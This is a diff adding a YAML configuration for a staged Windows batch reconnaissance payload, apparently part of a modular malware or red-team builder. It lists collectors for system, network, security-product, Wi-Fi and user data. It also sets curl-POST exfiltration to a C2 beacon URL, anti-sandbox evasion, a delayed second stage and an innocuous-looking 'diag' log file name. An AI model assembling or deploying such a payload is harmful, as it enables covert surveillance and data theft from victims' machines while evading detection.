@@ -1,0 +1,29 @@
+name: bat_recon_staged
+description: Staged batch recon - basic first, deep second with delay
+format: batch
+
+core:
+  - core/output
+
+stage1_collectors:
+  - collectors/sysinfo
+  - collectors/processes
+  - collectors/network
+
+stage2_collectors:
+  - collectors/security_products
+  - collectors/software
+  - collectors/scheduled_tasks
+  - collectors/wifi
+  - collectors/users
+
+exfil: exfil/curl_post
+arch: arch/staged
+
+evasion:
+  - evasion/anti_sandbox
+
+vars:
+  OUTPUT_FILE: "%TEMP%\\diag_%RANDOM%.log"
+  C2_URL: "http://10.0.2.2:9001/beacon"
+  STAGE2_DELAY: "60"
